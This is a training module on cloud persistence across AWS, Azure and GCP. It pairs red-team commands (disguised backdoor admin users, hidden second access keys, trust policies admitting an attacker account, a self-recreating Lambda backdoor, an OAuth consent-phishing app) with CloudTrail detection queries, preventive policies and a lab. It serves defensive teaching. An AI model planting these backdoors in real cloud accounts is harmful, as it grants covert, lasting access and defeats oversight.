# 07 — Persistence Techniques in Cloud

> **Level:** Advanced
> **Prereqs:** [Lambda Event Source Mapping Abuse](../Compute-Container-Security/lambda-event-source-mapping-abuse.md), [Secrets KMS](../Secrets-KMS), [Privilege Escalation Catalogue](privilege-escalation-catalogue.md)
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Persistence (T1098, T1136, T1078, T1578), Defense Evasion
**Authorization scope:** Run only against your own sandbox accounts / sanctioned engagement with written authorization. All ARNs, users, roles, and resource names below are placeholders.

## What & why
Cloud persistence means establishing durable access that survives credential rotation, instance termination, or even account remediation — using legitimate cloud primitives. Instead of registry Run keys or cron jobs, attackers create IAM users with access keys, backdoor trust policies on roles, and event-triggered Lambda functions that re-establish access whenever it's removed.

## The OnPrem reality
On-prem persistence uses registry `Run`/`RunOnce` keys, scheduled tasks, WMI event subscriptions, cron jobs, systemd timers, SSH authorized_keys modifications, and AD adminSDHolder abuse. All require ongoing access to the host OS. Cloud persistence survives without any host access — it lives in the control plane.

## Core concepts

### Persistence technique classes

| Class | Mechanism | Discoverability | Risk Level |
|---|---|---|---|
| **New IAM principal** | Create a new IAM user / SP / SA with access keys | Console visible; easy to audit | Medium |
| **Extra credential on existing principal** | Add a second access key to a legitimate user | Buried in existing user's key list; easy to miss | High |
| **Trust policy backdoor** | Modify a role's trust to allow an attacker account | Hard to spot unless trust policies are audited | High |
| **Event-triggered function** | Lambda / Cloud Function / Logic App triggered by innocuous events | Code review needed to find | Very High |
| **Scheduled function** | EventBridge rule + Lambda / Cloud Scheduler + Function | Shows up in scheduler inventory | Medium |
| **SSM document / Run Command** | Scheduled SSM document that re-establishes access | SSM document inventory | Medium |
| **OAuth application persistence** | App registration with persistent refresh token | Azure AD Enterprise App list | High |
| **Cross-account role assumption** | Role trust that accepts a role from another account the attacker controls | Trust policy audit | High |
| **CloudFormation/Terraform state persistence** | Stack that re-creates resources if deleted | Visible in stack inventory | Medium |

## Cross-cloud persistence matrix

| Persistence Technique | AWS | Azure | GCP | OnPrem |
|---|---|---|---|---|
| New IAM principal + keys | `CreateUser` + `CreateAccessKey` | `az ad sp create-for-rbac` | `gcloud iam sa create` + `keys create` | `net user backdoor P@ssw0rd /add` |
| Extra key on existing user | `CreateAccessKey` on `admin-user` | `az ad app credential reset --append` on existing SP | `gcloud iam sa keys create` on existing SA | Second SSH key in `authorized_keys` |
| Trust policy backdoor | `UpdateAssumeRolePolicy` adding attacker account | Add `app role` for attacker SP | `setIamPolicy` adding `serviceAccountTokenCreator` | AD domain trust creation |
| Event-triggered execution | Lambda event source mapping (SQS, DynamoDB, S3) | Logic App with Event Grid trigger | Cloud Function with Pub/Sub trigger | WMI event subscription |
| Scheduled execution | EventBridge rule → Lambda / SSM document | Logic App recurrence trigger | Cloud Scheduler → Cloud Function / Pub/Sub | Cron job / Scheduled Task |
| OAuth / federation persistence | Cognito identity pool with external IdP | OAuth 2.0 app with refresh token | Workload Identity Federation pool | Golden SAML ticket |
| Infrastructure-as-code backdoor | CloudFormation stack that re-creates resources | ARM template / Bicep with deployment stack | Deployment Manager config | GPO re-application |
| Resource sharing backdoor | Resource Access Manager (RAM) share | Azure Lighthouse delegation | Cross-project IAM binding | NFS export to attacker IP |

## AWS

### Persistence technique 1: New IAM user + access key

```bash
# Create a new IAM user with a name that blends in
aws iam create-user --user-name cloud-support-readonly --tags Key=Environment,Value=Production

# Attach a policy with the permissions you need
aws iam attach-user-policy --user-name cloud-support-readonly \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create an access key
aws iam create-access-key --user-name cloud-support-readonly
# Output (placeholder):
# {
#   "AccessKey": {
#     "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
#     "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
#   }
# }
```

**CloudTrail events emitted:**
- `CreateUser` (source: originating principal)
- `AttachUserPolicy` (source: originating principal)
- `CreateAccessKey` (source: originating principal)

### Persistence technique 2: Extra access key on existing user

```bash
# List users to find a target with high privileges
aws iam list-users --query 'Users[].UserName'

# Check user's attached policies
aws iam list-attached-user-policies --user-name legit-admin

# Create a SECOND access key for that user
aws iam create-access-key --user-name legit-admin
# This is stealthier than creating a new user — the key shows up as
# "Access Key 2" in the console, easy to overlook
```

**Why it's stealthy:** The access key list for `legit-admin` shows "Access Key 1" (legitimate, in use) and "Access Key 2" (backdoor, unused for months). Unless audit tools explicitly flag users with >1 key, this goes undetected.

### Persistence technique 3: Trust policy backdoor

```bash
# Modify a role's trust to allow an attacker-controlled role
aws iam update-assume-role-policy \
  --role-name admin-role \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Principal": {"AWS": "arn:aws:iam::111111111111:root"},
        "Action": "sts:AssumeRole"
      },
      {
        "Effect": "Allow",
        "Principal": {"AWS": "arn:aws:iam::999999999999:role/attacker-role"},
        "Action": "sts:AssumeRole"
      }
    ]
  }'
# Now the attacker in account 999999999999 can AssumeRole into admin-role
# even after initial access is revoked.
```

### Persistence technique 4: EventBridge + Lambda trigger

```bash
# Create a Lambda that re-creates a backdoor user if deleted
# handler.py:
import boto3
def handler(event, context):
    iam = boto3.client('iam')
    try:
        iam.get_user(UserName='cloud-support-readonly')
    except iam.exceptions.NoSuchEntityException:
        iam.create_user(UserName='cloud-support-readonly')
        iam.attach_user_policy(UserName='cloud-support-readonly', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
        iam.create_access_key(UserName='cloud-support-readonly')

# Deploy the function with an admin execution role
aws lambda create-function \
  --function-name healthcheck-processor \
  --runtime python3.9 \
  --role arn:aws:iam::111111111111:role/lambda-admin-role \
  --handler index.handler \
  --zip-file fileb://function.zip

# Create an EventBridge rule that triggers it every hour
aws events put-rule --name hourly-healthcheck --schedule-expression 'rate(1 hour)'
aws events put-targets --rule hourly-healthcheck \
  --targets "Id=1,Arn=arn:aws:lambda:us-east-1:111111111111:function:healthcheck-processor"
```

### Persistence technique 5: SSM document scheduled execution

```bash
# Create an SSM document that runs a script to re-establish access
aws ssm create-document \
  --name "SystemMaintenanceRoutine" \
  --document-type "Command" \
  --content '{
    "schemaVersion": "2.2",
    "mainSteps": [{
      "action": "aws:runShellScript",
      "name": "maintenance",
      "inputs": {"runCommand": ["aws iam create-access-key --user-name legit-admin"]}
    }]
  }'

# Schedule it via a State Manager association
aws ssm create-association \
  --name "AWS-RunRemoteScript" \
  --targets "Key=InstanceIds,Values=i-0abcdef1234567890" \
  --schedule-expression "rate(6 hours)"
```

## Azure

### Persistence technique 1: New service principal with secret

```bash
az ad sp create-for-rbac \
  --name "monitoring-automation-sp" \
  --role Contributor \
  --scopes /subscriptions/00000000-0000-0000-0000-000000000000
# Creates an SP with a password-based secret — long-lived credential
```

### Persistence technique 2: Extra secret on existing app registration

```bash
# Add a second credential to an existing privileged SP
az ad app credential reset \
  --id 00000000-0000-0000-0000-000000000000 \
  --append \
  --display-name "backup-auth-key"
# This SP now has two valid secrets — one legitimate, one attacker-controlled
```

### Persistence technique 3: Logic App with recurrence trigger

```bash
# Create a Logic App that runs daily and re-establishes access
az logic workflow create \
  --name "DailyComplianceCheck" \
  --resource-group example-rg \
  --location eastus \
  --definition '{
    "triggers": {
      "Recurrence": {
        "type": "Recurrence",
        "recurrence": {"frequency": "Day", "interval": 1}
      }
    },
    "actions": {
      "AddSecret": {
        "type": "Http",
        "inputs": {
          "method": "POST",
          "uri": "https://graph.microsoft.com/v1.0/applications/00000000-0000-0000-0000-000000000000/addPassword"
        }
      }
    }
  }'
```

### Persistence technique 4: OAuth app consent persistence

```bash
# Register an app in attacker tenant that requests broad permissions
az ad app create \
  --display-name "Productivity Dashboard" \
  --required-resource-accesses '[
    {"resourceAppId":"00000003-0000-0000-c000-000000000000",
     "resourceAccess":[{"id":"<mail.read-id>","type":"Scope"},
                       {"id":"<mail.send-id>","type":"Scope"}]}]'
# If a victim grants consent (phishing), the attacker has persistent access
# via refresh tokens that survive password changes.
```

## GCP

### Persistence technique 1: New service account + key

```bash
gcloud iam service-accounts create sa-backup-operator \
  --display-name="Backup Operations SA" \
  --project=example-project

gcloud projects add-iam-policy-binding example-project \
  --member=serviceAccount:sa-backup-operator@example-project.iam.gserviceaccount.com \
  --role=roles/editor

gcloud iam service-accounts keys create backup-key.json \
  --iam-account=sa-backup-operator@example-project.iam.gserviceaccount.com
```

### Persistence technique 2: Extra key on existing SA

```bash
# Find existing high-priv SAs
gcloud projects get-iam-policy example-project --format=json | \
  jq -r '.bindings[] | select(.role=="roles/owner") | .members[]' | grep gserviceaccount

# Create a second key on that SA
gcloud iam service-accounts keys create second-key.json \
  --iam-account=owner-sa@example-project.iam.gserviceaccount.com
```

### Persistence technique 3: Cloud Scheduler + Cloud Function

```bash
# Create a Cloud Function that re-creates access
gcloud functions deploy persistence-check \
  --runtime python39 \
  --trigger-http \
  --entry-point check_access \
  --service-account=sa-backup-operator@example-project.iam.gserviceaccount.com \
  --source=./persistence-func

# Create a Cloud Scheduler job that triggers it hourly
gcloud scheduler jobs create http hourly-persistence-check \
  --schedule="0 * * * *" \
  --uri="https://us-central1-example-project.cloudfunctions.net/persistence-check" \
  --http-method=GET \
  --oidc-service-account-email=sa-backup-operator@example-project.iam.gserviceaccount.com
```

### Persistence technique 4: Pub/Sub triggered function

```bash
# Deploy a function that triggers on a specific Pub/Sub topic
gcloud functions deploy reconstitutor \
  --runtime python39 \
  --trigger-topic system-health-events \
  --entry-point reconstitute \
  --service-account=sa-backup-operator@example-project.iam.gserviceaccount.com
# Attacker publishes a message to the topic to trigger access re-creation
```

## OnPrem mapping (recap table)

| Persistence Technique | OnPrem | AWS | Azure | GCP |
|---|---|---|---|---|
| New account | `net user` / LDAP add | `CreateUser` + `CreateAccessKey` | `az ad sp create-for-rbac` | `gcloud iam sa create` + `keys create` |
| Extra credential | Second authorized_keys entry | Second access key on existing user | Second app secret on existing SP | Second SA key |
| Scheduled re-access | Cron job / Scheduled Task | EventBridge rule + Lambda | Logic App recurrence trigger | Cloud Scheduler + Cloud Function |
| Event-driven re-access | WMI event subscription | Lambda event source mapping | Logic App with Event Grid trigger | Cloud Function with Pub/Sub trigger |
| Trust backdoor | Domain trust creation | `UpdateAssumeRolePolicy` | RBAC role assignment for external SP | `setIamPolicy` with external member |
| OAuth/federation | Golden SAML | Cognito identity pool | OAuth app + refresh token | Workload Identity Federation |
| IaC backdoor | GPO re-apply | CloudFormation stack | Bicep/ARM deployment | Deployment Manager config |

## 🔴 Red Team view

### The hidden extra-key pattern

The stealthiest persistence technique across all clouds: add a second credential to an existing, legitimate, high-privilege principal.

**Why it works:**
- No new IAM entity to audit — the user/SP/SA already exists.
- The console shows "Access Key 2" or "Secret 2" — visually subtle.
- Most inventory tools report "has access keys: true" — but not how many.
- The second key is never used for months, so `GetAccessKeyLastUsed` shows no activity.

**Discovery window:**
- AWS: `aws iam list-access-keys --user-name legit-admin` shows all keys.
- Azure: `az ad app credential list --id <app-id>` shows all secrets.
- GCP: `gcloud iam service-accounts keys list` shows all keys.

**Defender detection:**
```bash
# AWS: Find users with >1 access key
aws iam list-users --query 'Users[].UserName' --output text | while read u; do
  count=$(aws iam list-access-keys --user-name "$u" --query 'length(AccessKeyMetadata[?Status==`Active`])' --output text)
  if [ "$count" -gt 1 ]; then
    echo "ALERT: $u has $count active access keys"
  fi
done

# Azure: Find apps with >1 valid password credential
az ad app list --query "[?length(passwordCredentials[?endDateTime>='$(date -u +%Y-%m-%dT%H:%M:%SZ)']) > 1].{Name:displayName,AppId:appId}"

# GCP: Find SAs with >1 key
gcloud iam service-accounts list --format=json | jq -r '.[].email' | while read sa; do
  count=$(gcloud iam service-accounts keys list --iam-account="$sa" --format=json | jq 'length')
  if [ "$count" -gt 1 ]; then
    echo "ALERT: $sa has $count keys"
  fi
done
```

### Blending in: naming conventions

Attackers choose names that match corporate naming patterns:
- `cloud-support-readonly` (sounds like a support role)
- `monitoring-automation-sp` (sounds like a monitoring service principal)
- `sa-backup-operator` (sounds like a backup SA)
- `auto-scaling-checker` (sounds like an autoscaling Lambda)

## 🔵 Blue Team view

### Detection signals

**1. Alert on CreateAccessKey for human users**
```sql
-- AWS CloudTrail Athena
SELECT eventtime, useridentity.arn, requestparameters.username, sourceipaddress
FROM cloudtrail_logs
WHERE eventname = 'CreateAccessKey'
  AND useridentity.arn LIKE '%:user/%'  -- human user, not assumed role
  AND eventtime > now() - interval '1' day;
```

**2. Alert on new IAM user created outside standard provisioning**
```sql
SELECT eventtime, useridentity.arn, requestparameters.username
FROM cloudtrail_logs
WHERE eventname = 'CreateUser'
  AND useridentity.arn NOT LIKE '%:role/terraform-%'
  AND useridentity.arn NOT LIKE '%:role/ci-%'
  AND eventtime > now() - interval '1' day;
```

**3. Alert on trust policy modification**
```sql
SELECT eventtime, useridentity.arn, requestparameters.rolename
FROM cloudtrail_logs
WHERE eventname = 'UpdateAssumeRolePolicy'
  AND eventtime > now() - interval '1' day;
```

**4. Alert on Lambda function creation with privileged role**
```sql
SELECT eventtime, useridentity.arn, requestparameters.functionname, requestparameters.role
FROM cloudtrail_logs
WHERE eventname = 'CreateFunction20150331'
  AND requestparameters.role LIKE '%Admin%'
  AND eventtime > now() - interval '1' day;
```

**5. Alert on EventBridge rule creation targeting Lambda**
```sql
SELECT eventtime, useridentity.arn, requestparameters.name
FROM cloudtrail_logs
WHERE eventname IN ('PutRule', 'PutTargets')
  AND eventtime > now() - interval '1' day;
```

### Preventive controls

1. **SCP: Deny CreateAccessKey for all IAM users**
   ```json
   {"Effect":"Deny","Action":"iam:CreateAccessKey","Resource":"arn:aws:iam::*:user/*"}
   ```

2. **SCP: Deny UpdateAssumeRolePolicy unless from a specific CI role**
   ```json
   {"Effect":"Deny","Action":"iam:UpdateAssumeRolePolicy","Resource":"*","Condition":{"ArnNotLike":{"aws:PrincipalArn":"arn:aws:iam::111111111111:role/terraform-admin"}}}
   ```

3. **Azure: Require PIM activation for app credential modifications**

4. **GCP: Org policy to disable SA key creation entirely**
   ```bash
   gcloud org-policies set-policy --organization=0000000000 disable-sa-keys.yaml
   ```

### Daily inventory script

```bash
#!/bin/bash
# Run daily; diff against yesterday to find new persistence artifacts

echo "=== New IAM Users (last 24h) ==="
aws iam list-users --query "Users[?CreateDate>='$(date -v-1d +%Y-%m-%dT%H:%M:%SZ')].[UserName,CreateDate]" --output table

echo "=== Users with >1 Access Key ==="
aws iam list-users --query 'Users[].UserName' --output text | while read u; do
  count=$(aws iam list-access-keys --user-name "$u" --query 'length(AccessKeyMetadata[?Status==`Active`])' --output text)
  [ "$count" -gt 1 ] && echo "$u: $count keys"
done

echo "=== Recently Modified Trust Policies ==="
aws cloudtrail lookup-events --lookup-attributes \
  AttributeKey=EventName,AttributeValue=UpdateAssumeRolePolicy \
  --start-time "$(date -v-1d +%s)" --max-results 20

echo "=== New Lambda Functions ==="
aws lambda list-functions --query "Functions[?LastModified>='$(date -v-1d +%Y-%m-%d)'].[FunctionName,Role]" --output table

echo "=== New EventBridge Rules ==="
aws events list-rules --query "Rules[?State=='ENABLED'].[Name,ScheduleExpression]" --output table
```

## Hands-on lab

**Objective:** Create a persistence artifact, detect it, then remove it.

1. **Create a backdoor IAM user:**
   ```bash
   aws iam create-user --user-name pentest-persistence-lab
   aws iam attach-user-policy --user-name pentest-persistence-lab \
     --policy-arn arn:aws:iam::aws:policy/ReadOnlyAccess
   aws iam create-access-key --user-name pentest-persistence-lab
   ```

2. **Create a second access key on yourself:**
   ```bash
   YOUR_USER=$(aws sts get-caller-identity --query 'Arn' --output text | cut -d/ -f2)
   aws iam create-access-key --user-name "$YOUR_USER"
   ```

3. **Detect your own artifacts:**
   ```bash
   # 24h inventory
   aws iam list-users --query "Users[?CreateDate>='$(date -v-1d +%Y-%m-%dT%H:%M:%SZ')]"

   # Multi-key users
   aws iam list-access-keys --user-name "$YOUR_USER" --query 'length(AccessKeyMetadata)'
   ```

4. **Check CloudTrail for detection events:**
   ```bash
   aws cloudtrail lookup-events --lookup-attributes \
     AttributeKey=EventName,AttributeValue=CreateUser --max-results 5
   aws cloudtrail lookup-events --lookup-attributes \
     AttributeKey=EventName,AttributeValue=CreateAccessKey --max-results 5
   ```

**Expected output:** All creation events visible in CloudTrail.

**Teardown:**
```bash
AWS_KEY=$(aws iam list-access-keys --user-name "$YOUR_USER" --query 'AccessKeyMetadata[1].AccessKeyId' --output text)
aws iam delete-access-key --user-name "$YOUR_USER" --access-key-id "$AWS_KEY"
aws iam detach-user-policy --user-name pentest-persistence-lab --policy-arn arn:aws:iam::aws:policy/ReadOnlyAccess
aws iam delete-access-key --user-name pentest-persistence-lab --access-key-id $(aws iam list-access-keys --user-name pentest-persistence-lab --query 'AccessKeyMetadata[0].AccessKeyId' --output text)
aws iam delete-user --user-name pentest-persistence-lab
```

## Detection rules & checklists

### Sigma rule: New IAM user created outside working hours

```yaml
title: IAM User Created Outside Business Hours
status: experimental
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventName: CreateUser
  timeframe: 1d
  condition: selection
level: low
```

### Cloud Custodian: remove users with 2+ access keys

```yaml
policies:
  - name: max-one-access-key
    resource: aws.iam-user
    filters:
      - type: credential
        key: access_keys
        value: 1
        op: greater-than
    actions:
      - type: notify
        template: too-many-keys
```

### Checklist

- [ ] SCP denies `CreateAccessKey` for IAM users
- [ ] SCP denies `UpdateAssumeRolePolicy` without MFA
- [ ] Alert on `CreateUser` outside CI/CD account
- [ ] Alert on users with >1 active access key
- [ ] Daily inventory diff of IAM entities, SAs, SPs
- [ ] Audit trust policies weekly for unknown principals
- [ ] Azure: Alert on `Add password credential` to existing apps
- [ ] GCP: Org policy disables SA key creation

## References

- [AWS Incident Response Guide](https://docs.aws.amazon.com/whitepapers/latest/aws-security-incident-response-guide/welcome.html)
- [Azure AD Security Operations Guide](https://learn.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-introduction)
- [GCP Detecting Persistence](https://cloud.google.com/blog/topics/threat-intelligence/gcp-threat-detection-security)
- [MITRE ATT&CK Persistence (Cloud)](https://attack.mitre.org/tactics/TA0003/)
- See also: [09-05-privilege-escalation-catalogue.md](./privilege-escalation-catalogue.md)
- See also: [09-08-evasion-and-trail-free-actions.md](./evasion-and-trail-free-actions.md)
